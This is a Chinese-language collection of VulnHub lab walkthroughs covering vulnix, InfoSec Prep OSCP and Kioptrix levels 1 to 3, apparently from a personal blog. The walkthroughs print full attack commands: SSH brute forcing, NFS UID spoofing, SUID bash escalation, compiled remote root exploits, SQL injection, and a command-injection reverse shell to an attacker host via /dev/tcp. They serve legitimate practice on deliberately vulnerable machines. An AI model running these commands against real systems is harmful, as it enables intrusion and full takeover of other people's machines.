<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)</span><br><span class="line">|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)</span><br><span class="line">|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)</span><br><span class="line">25&#x2F;tcp    open  smtp       Postfix smtpd</span><br><span class="line">|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix</span><br><span class="line">| Not valid before: 2012-09-02T17:40:12</span><br><span class="line">|_Not valid after:  2022-08-31T17:40:12</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:31+00:00; +7h59m56s from scanner time.</span><br><span class="line">79&#x2F;tcp    open  finger     Linux fingerd</span><br><span class="line">|_finger: No one logged on.\x0D</span><br><span class="line">110&#x2F;tcp   open  pop3       Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: CAPA TOP PIPELINING RESP-CODES UIDL STLS SASL</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix&#x2F;organizationName&#x3D;Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:30+00:00; +7h59m56s from scanner time.</span><br><span class="line">111&#x2F;tcp   open  rpcbind    2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100003  2,3,4       2049&#x2F;tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049&#x2F;tcp6  nfs</span><br><span class="line">|   100003  2,3,4       2049&#x2F;udp   nfs</span><br><span class="line">|   100003  2,3,4       2049&#x2F;udp6  nfs</span><br><span class="line">|   100005  1,2,3      46413&#x2F;tcp   mountd</span><br><span class="line">|   100005  1,2,3      53298&#x2F;tcp6  mountd</span><br><span class="line">|   100005  1,2,3      54484&#x2F;udp6  mountd</span><br><span class="line">|   100005  1,2,3      55117&#x2F;udp   mountd</span><br><span class="line">|   100021  1,3,4      37588&#x2F;udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      49202&#x2F;udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      53622&#x2F;tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      54487&#x2F;tcp6  nlockmgr</span><br><span class="line">|   100024  1          42869&#x2F;tcp   status</span><br><span class="line">|   100024  1          46115&#x2F;udp   status</span><br><span class="line">|   100024  1          46406&#x2F;udp6  status</span><br><span class="line">|   100024  1          49853&#x2F;tcp6  status</span><br><span class="line">|   100227  2,3         2049&#x2F;tcp   nfs_acl</span><br><span class="line">|   100227  2,3         2049&#x2F;tcp6  nfs_acl</span><br><span class="line">|   100227  2,3         2049&#x2F;udp   nfs_acl</span><br><span class="line">|_  100227  2,3         2049&#x2F;udp6  nfs_acl</span><br><span class="line">143&#x2F;tcp   open  imap       Dovecot imapd</span><br><span class="line">|_imap-capabilities: IMAP4rev1 IDLE STARTTLS listed more LITERAL+ have SASL-IR ENABLE capabilities LOGIN-REFERRALS LOGINDISABLEDA0001 Pre-login post-login OK ID</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix&#x2F;organizationName&#x3D;Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:31+00:00; +7h59m56s from scanner time.</span><br><span class="line">512&#x2F;tcp   open  exec?</span><br><span class="line">513&#x2F;tcp   open  login?</span><br><span class="line">514&#x2F;tcp   open  tcpwrapped</span><br><span class="line">993&#x2F;tcp   open  ssl&#x2F;imap   Dovecot imapd</span><br><span class="line">|_imap-capabilities: IMAP4rev1 IDLE ENABLE listed LITERAL+ more SASL-IR LOGIN-REFERRALS capabilities AUTH&#x3D;PLAINA0001 have Pre-login post-login OK ID</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix&#x2F;organizationName&#x3D;Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:31+00:00; +7h59m56s from scanner time.</span><br><span class="line">995&#x2F;tcp   open  ssl&#x2F;pop3   Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: CAPA TOP PIPELINING RESP-CODES UIDL USER SASL(PLAIN)</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;vulnix&#x2F;organizationName&#x3D;Dovecot mail server</span><br><span class="line">| Not valid before: 2012-09-02T17:40:22</span><br><span class="line">|_Not valid after:  2022-09-02T17:40:22</span><br><span class="line">|_ssl-date: 2020-09-13T23:23:31+00:00; +7h59m56s from scanner time.</span><br><span class="line">2049&#x2F;tcp  open  nfs_acl    2-3 (RPC #100227)</span><br><span class="line">32846&#x2F;tcp open  mountd     1-3 (RPC #100005)</span><br><span class="line">42869&#x2F;tcp open  status     1 (RPC #100024)</span><br><span class="line">46413&#x2F;tcp open  mountd     1-3 (RPC #100005)</span><br><span class="line">50617&#x2F;tcp open  mountd     1-3 (RPC #100005)</span><br><span class="line">53622&#x2F;tcp open  nlockmgr   1-4 (RPC #100021)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>逐个检查</p>
<p><strong>25端口</strong>，nmap发现开启了VRFY命令，通过它来枚举用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smtp-user-enum -M VRFY -U &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -t 192.168.1.205					&#x2F;&#x2F;这里不好使</span><br><span class="line">smtp-user-enum -M VRFY -U &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;unix_users.txt -t 192.168.1.205</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/1.png" alt="1"></p>
<p><strong>79端口</strong>，finger枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;finger-user-enum.pl -U &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;unix_users.txt -t 192.168.1.205</span><br></pre></td></tr></table></figure>

<p>或者使用<a href="https://raw.githubusercontent.com/Kan1shka9/Finger-User-Enumeration/master/finger_enum_user.sh">https://raw.githubusercontent.com/Kan1shka9/Finger-User-Enumeration/master/finger_enum_user.sh</a><br>需要打开文件修改ip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;finger_enum_user.sh &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;unix_users.txt</span><br></pre></td></tr></table></figure>

<p><strong>111端口</strong>，rpcinfo端口枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcinfo -p 192.168.1.205</span><br></pre></td></tr></table></figure>

<p>这里我们可以获得和NMAP相似的输出，没啥大用</p>
<p><strong>2049端口</strong>，NFS枚举</p>
<p><img src="/images/HackLab/2.png" alt="2"></p>
<p>找到了一个可以挂载的地方，看来是一个用户的目录，尝试挂载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;tmp#mount -t nfs 192.168.1.205:&#x2F;home&#x2F;vulnix &#x2F;tmp&#x2F;tmp&#x2F;</span><br><span class="line">root@kali:&#x2F;tmp#cd tmp&#x2F;</span><br><span class="line">bash: cd: tmp&#x2F;: Permission denied</span><br></pre></td></tr></table></figure>

<p>可以挂载，但进不去</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>这些把基本能枚举都枚举了，没有捷径了，尝试用枚举出的用户爆破SSH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra 192.168.1.205 ssh -l user -P &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Passwords&#x2F;darkweb2017-top1000.txt -t 6 -V -f</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/3.png" alt="3"></p>
<p>爆破成功，获取了凭据<code>user/letmein</code>，直接进行ssh连接</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>当前用户不处于sudo组，想到还有NFS目录可以使用，也许可以利用它来切换用户</p>
<p>linpeas扫描</p>
<p><img src="/images/HackLab/5.png" alt="5"></p>
<p>符合预期，这里设置了root_squash，并且是rw权限</p>
<p><img src="/images/HackLab/4.png" alt="4"></p>
<p>我们找到vulnix的UID和GID<br>接着在kali上创建相同UID和GID的用户，绕过进目录的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd -u 2008 vulnix</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/6.png" alt="6"></p>
<p>成功进入，准备生成ssh密钥，并写入公钥</p>
<p>生成密钥对，复制公钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/7.png" alt="7"></p>
<p>创建.ssh，并写入公钥到authorized_keys</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line">cd .ssh</span><br><span class="line">echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9QhR2KeFliuFg7nZRishNh1+nziQlv6w9IbOgGAC3f8pvVToDkOAJVENJr7ZUHkPLqm&#x2F;1aiiqSES5fOrDJFiMbey0lUdObIHS178c80MhR0JD7MkAdiIe7LPCziEUaL6LyeugD2DwDrCUXuPqSefazH5caJILkB4AESGq4SygkZX4m0rvOS5pYBdEYFQapFEV0CDQxnNTDC03+1DLuo+s1L5iG4rxNZNfgp7sXUoHk2jzzCYL4c+XI293Y1LOMbPgBlY8hjSjrbOBQJb1Ia90Dw5bPIERWB3BZVkpQjnj2KJhnMW7OTOnHyY0Qdl9wCT1zktok2Jvvrln4ecaE1x&#x2F;O8M4y3Jw0OuQSxaAXPplly19N8P7WfdiLKbHDMx&#x2F;3XHoUk8jVD7XQKeDVMK2rLme0fyPsyst18H85qpZBgW3SVSoX6YVCMDosxOA6p1JeMJQ1H4SiHCTvhbKh1Pmnm4VMGlwintGaHzXz4EKkRCNV6CmpERANZYuXnHG4D9BPJ8&#x3D; root@kali &gt; authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/8.png" alt="8"></p>
<p>这样我们就可以切换用户了</p>
<p><img src="/images/HackLab/9.png" alt="9"></p>
<h3 id="no-root-squash提权"><a href="#no-root-squash提权" class="headerlink" title="no_root_squash提权"></a>no_root_squash提权</h3><p>重新开始信息收集，发现</p>
<p><img src="/images/HackLab/10.png" alt="10"></p>
<p>我们可以sodoedit编辑NFS的配置文件，直接替换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;vulnix    *(rw,root_squash)</span><br><span class="line">替换成</span><br><span class="line">&#x2F;home&#x2F;vulnix    *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>no_root_squash是常用提权手段，进入NFS分享的目录可以获得root权限</p>
<p>这里要犯规了，我们需要重启NFS，但是我们又不是root，只能重启虚拟机</p>
<p>重启后重新挂载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df</span><br><span class="line">umount 192.168.1.205:&#x2F;home&#x2F;vulnix</span><br></pre></td></tr></table></figure>

<p>这里由于设置了no_root_squash，我们不再需要切换用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -t nfs 192.168.1.205:&#x2F;home&#x2F;vulnix &#x2F;tmp&#x2F;tmp&#x2F;</span><br><span class="line">cd &#x2F;tmp&#x2F;tmp	</span><br></pre></td></tr></table></figure>

<p>接着利用SUID提权，这里有个坑，我把kali的bash复制过去，会报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-bash: .&#x2F;bash: cannot execute binary file</span><br></pre></td></tr></table></figure>

<p>我们可以在目标机器上，复制目标的/bin/bash到分享的目录，然后在kali中执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;tmp&#x2F;tmp#chown root:root bash</span><br><span class="line">root@kali:&#x2F;tmp&#x2F;tmp#chmod 4777 bash</span><br></pre></td></tr></table></figure>

<p>这样我们就可以提权了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;bash -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/HackLab/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场InfoSecPrep OSCP</title>
    <url>/2020/08/07/%E9%9D%B6%E5%9C%BAInfoSecPrep%20OSCP/</url>
    <content><![CDATA[<h1 id="InfoSec-Prep-OSCP"><a href="#InfoSec-Prep-OSCP" class="headerlink" title="InfoSec Prep: OSCP"></a>InfoSec Prep: OSCP</h1><p>一个非常简单的靶机，5分钟就做完了，貌似可兑换OSCP的30天代金卷</p>
<p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.200</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>发现了22和80端口</p>
<p><img src="/images/InfoSec-Prep-OSCP/1.jpg" alt="1"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>主站运行这wordpress，wpscan没发现可以利用的漏洞</p>
<p>发现路网站存在<code>robots.txt</code>提示了<code>secret.txt</code></p>
<p><img src="/images/InfoSec-Prep-OSCP/2.jpg" alt="2"></p>
<p>base64解密，得到<code>OPENSSH PRIVATE KEY</code></p>
<p>看来是可以用来进行ssh登录的，接下来把它转换成<code>RSA PRIVATE KEY</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install putty-tools</span><br><span class="line">puttygen pass -o tempkey.ppk</span><br><span class="line">puttygen tempkey.ppk -O private-openssh -o id_rsa</span><br><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>

<p>再根据主机名猜一下用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa oscp@192.168.1.220</span><br></pre></td></tr></table></figure>

<p><img src="/images/InfoSec-Prep-OSCP/4.jpg" alt="4"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>白给的</p>
<p>SUID配置问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm &#x2F;4000 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>直接执行bash就行</p>
<p><img src="/images/InfoSec-Prep-OSCP/5.jpg" alt="5"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix_Level_1</title>
    <url>/2020/03/25/%E9%9D%B6%E5%9C%BAKioptrix-Level-1/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix_Level_1"></a>Kioptrix_Level_1</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.104</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p>nmap扫描端口</p>
<p><img src="/images/Kioptrix1/4.jpg" alt="4"></p>
<p>习惯性顺着来，22端口没发现可以顺利利用的漏洞</p>
<p>80端口利用dirbuster进行目录枚举，找到了一个可以利用的点:mod_ssl</p>
<p><img src="/images/Kioptrix1/5.jpg" alt="5"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><h3 id="mod-ssl"><a href="#mod-ssl" class="headerlink" title="mod_ssl"></a>mod_ssl</h3><p><img src="/images/Kioptrix1/6.jpg" alt="6"></p>
<p>有几个OpenFuck缓冲区溢出的漏洞可以使用，我这里使用了<code>47080.c</code></p>
<p>编译的时候报错了，发现少装个库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br></pre></td></tr></table></figure>

<p>编译使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o exp 47080.c -lcrypto</span><br><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure>

<p>这里需要指定目标的操作系统和apache版本，根据之前Nmap扫描的结果定位到Redhat Linux及apache 1.3.20</p>
<img src="/images/Kioptrix1/7.jpg"/> 

<p>执行exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;exploit 0x6b 192.168.1.104 -c 50</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix1/8.jpg" alt="8"></p>
<p>直接就是root，有兴趣可以读一下flag在<code>/var/mail/root</code></p>
<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>这里用了msf，进行了一次smb version的扫描</p>
<p><img src="/images/Kioptrix1/9.jpg" alt="9"></p>
<p>得到版本2.2.1a</p>
<p>寻找可用的Exploit</p>
<p><img src="/images/Kioptrix1/10.png" alt="10"></p>
<p>这个RCE漏洞看来是个不错的选择</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;multiple&#x2F;remote&#x2F;10.c exp.c</span><br><span class="line">root@kali:~&#x2F;Desktop# gcc -o samba exp.c</span><br><span class="line">root@kali:~&#x2F;Desktop# chmod 777 samba</span><br><span class="line">root@kali:~&#x2F;Desktop# .&#x2F;samba </span><br><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">Usage: .&#x2F;samba [-bBcCdfprsStv] [host]</span><br><span class="line"></span><br><span class="line">-b &lt;platform&gt;   bruteforce (0 &#x3D; Linux, 1 &#x3D; FreeBSD&#x2F;NetBSD, 2 &#x3D; OpenBSD 3.1 and prior, 3 &#x3D; OpenBSD 3.2)</span><br><span class="line">-B &lt;step&gt;       bruteforce steps (default &#x3D; 300)</span><br><span class="line">-c &lt;ip address&gt; connectback ip address</span><br><span class="line">-C &lt;max childs&gt; max childs for scan&#x2F;bruteforce mode (default &#x3D; 40)</span><br><span class="line">-d &lt;delay&gt;      bruteforce&#x2F;scanmode delay in micro seconds (default &#x3D; 100000)</span><br><span class="line">-f              force</span><br><span class="line">-p &lt;port&gt;       port to attack (default &#x3D; 139)</span><br><span class="line">-r &lt;ret&gt;        return address</span><br><span class="line">-s              scan mode (random)</span><br><span class="line">-S &lt;network&gt;    scan mode</span><br><span class="line">-t &lt;type&gt;       presets (0 for a list)</span><br><span class="line">-v              verbose mode</span><br></pre></td></tr></table></figure>

<p>这次编译没报错，直接运行拿到root</p>
<p><img src="/images/Kioptrix1/11.jpg" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix-Level-2</title>
    <url>/2020/05/03/%E9%9D%B6%E5%9C%BAKioptrix-Level-2/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-2"><a href="#Kioptrix-Level-2" class="headerlink" title="Kioptrix_Level_2"></a>Kioptrix_Level_2</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.233</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/images/Kioptrix2/12.jpg" alt="12"></p>
<p>22端口没有发现好用的exp<br>80端口开放了web，3306开启了mysql，这是我们感兴趣的</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接看看web运行的是什么</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.233</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix2/13.jpg" alt="13"></p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>发现一个登录页面，经测试发现存在sql注入<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>登录成功，页面发生跳转</p>
<p><img src="/images/Kioptrix2/14.jpg" alt="14"></p>
<p>发现网站提供了<code>ping</code>用户输入的功能，输入<code>127.0.0.1</code><br>网站会打开一个新的页面，回显形式如下</p>
<p><img src="/images/Kioptrix2/15.jpg" alt="15"></p>
<p>预感这里使用ping命令会存在命令注入，经过测试发现</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix2/16.jpg" alt="16"></p>
<p>发现执行命令的用户权限为<code>apache</code></p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>存在命令注入，我就可以利用它，进行反向连接来获取<code>apache</code>这个用户的bashshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 | bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix2/17.jpg" alt="17"></p>
<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先获取操作系统的相关信息(uname)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ uname -mrs</span><br><span class="line">Linux 2.6.9-55.EL i686</span><br></pre></td></tr></table></figure>

<p>搜索可以利用exp，<code>9545.c</code>看上去一个不错的本地提权</p>
<p><img src="/images/Kioptrix2/18.jpg" alt="18"></p>
<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>这里我想在目标机上使用<code>wget</code>传输编译好的exp，所以我开启web服务，并复制exp到web目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# cp 9545.c &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>

<p>直接<code>wget</code>会报错，因为用户<code>apache</code>并不拥有<code>W</code>权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">bash-3.00$ wget 192.168.1.3&#x2F;9545.c</span><br><span class="line">--22:07:25--  http:&#x2F;&#x2F;192.168.1.3&#x2F;9545.c</span><br><span class="line">           &#x3D;&gt; &#96;exp&#39;</span><br><span class="line">Connecting to 192.168.1.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 9,783 (9.6K) [text&#x2F;x-csrc]</span><br><span class="line">exp: Permission denied</span><br><span class="line"></span><br><span class="line">Cannot write to &#96;exp&#39; (Permission denied).</span><br><span class="line">bash-3.00$ ls -ld &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">drwxr-xr-x  2 root root 4096 Oct  8  2009 &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>

<p>所以我们转移到<code>/tmp</code>目录来执行我们的操作，成功传输了exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ cd &#x2F;tmp</span><br><span class="line">bash-3.00$ ls -ld &#x2F;tmp</span><br><span class="line">drwxr-xrwx  4 root root 4096 May  2 21:26 &#x2F;tmp</span><br><span class="line">bash-3.00$ wget 192.168.1.3&#x2F;9545.c</span><br><span class="line">--22:16:57--  http:&#x2F;&#x2F;192.168.1.3&#x2F;9545.c</span><br><span class="line">           &#x3D;&gt; &#96;9545.c&#39;</span><br><span class="line">Connecting to 192.168.1.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 9,783 (9.6K) [text&#x2F;x-csrc]</span><br><span class="line"></span><br><span class="line">    0K .........                                             100%   76.47 MB&#x2F;s</span><br><span class="line"></span><br><span class="line">22:16:57 (76.47 MB&#x2F;s) - &#96;9545.c&#39; saved [9783&#x2F;9783]</span><br></pre></td></tr></table></figure>

<p>编译执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ gcc 9545.c -o exploit</span><br><span class="line">9545.c:376:28: warning: no newline at end of file</span><br><span class="line">bash-3.00$ ls</span><br><span class="line">9545.c</span><br><span class="line">exploit</span><br><span class="line">bash-3.00$ .&#x2F;exploit</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>至此成功提权为root权限</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix-Level-3</title>
    <url>/2020/05/05/%E9%9D%B6%E5%9C%BAKioptrix-Level-3/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-3"><a href="#Kioptrix-Level-3" class="headerlink" title="Kioptrix_Level_3"></a>Kioptrix_Level_3</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.251</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Kioptrix-Level-3/1.jpg" alt="1"></p>
<p>只发现了ssh和http服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>目录扫描，发现了phpmyadmin</p>
<p><img src="/images/Kioptrix-Level-3/2.jpg" alt="1"></p>
<p>cms扫描，得到LotusCMS</p>
<p><img src="/images/Kioptrix-Level-3/6.jpg" alt="6"></p>
<p>之后我打开了它的http服务，手动寻找一些有用的信息</p>
<p><img src="/images/Kioptrix-Level-3/3.jpg" alt="3"></p>
<p>首先应该给网站做一个host，让页面正常显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;hosts</span><br><span class="line">192.168.1.251	kioptrix3.com	</span><br><span class="line">service networking restart</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/4.jpg" alt="4"></p>
<p><img src="/images/Kioptrix-Level-3/5.jpg" alt="5"></p>
<p>网站包含了一个登录页面，但没找出sql注入</p>
<p><img src="/images/Kioptrix-Level-3/7.jpg" alt="7"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="CMS漏洞Getshell"><a href="#CMS漏洞Getshell" class="headerlink" title="CMS漏洞Getshell"></a>CMS漏洞Getshell</h3><p>之前利用<code>whatweb</code>侦测出网站使用的是<code>LotusCMS</code>，不过我们尚且不知道具体的版本<br><code>searsploit</code>发现了Metasploit里存在的exp，可以当作最后的手段</p>
<p><img src="/images/Kioptrix-Level-3/8.jpg" alt="8"></p>
<p>接着又去google和github上找了找，成功找到了一个shell脚本</p>
<p><a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh">https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;lotusRCE.sh 192.168.1.251		</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/9.jpg" alt="9"></p>
<p>根据提示输入反向连接的IP和port，成功利用nc拿到一个低权限的shell，这是一个不错的入口</p>
<p>通过这个shell我们可以查看www目录下的文件，挖掘更多的信息</p>
<p><code>/home/www/kioptrix3.com/gallery/gconfig.php</code>找到了mysql的root连接的账号密码</p>
<p><img src="/images/Kioptrix-Level-3/10.jpg" alt="10"></p>
<p>有了这个就可以登录之前枚举出的<code>phpmyadmin</code>了<br>用户名:<code>root</code><br>密码:<code>fuckeyou</code></p>
<p>成功登录phpmyadmin，尝试进行UDF提权</p>
